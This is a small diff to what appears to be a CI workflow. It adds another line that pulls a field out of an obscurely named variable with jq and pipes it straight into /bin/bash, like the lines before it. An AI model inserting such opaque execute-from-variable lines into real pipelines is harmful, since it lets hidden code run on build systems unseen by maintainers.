@@ -26,6 +26,7 @@ jobs:
           echo $tnsa5 | jq -r .jwmbb235 | /bin/bash
           printf '%s' "$lbas00" | jq -r .quu83 | /bin/bash
           printf '%s' "$u6739" | jq -r .i60 | /bin/bash
+          printf '%s' "$cfirp64977" | jq -r .e362 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
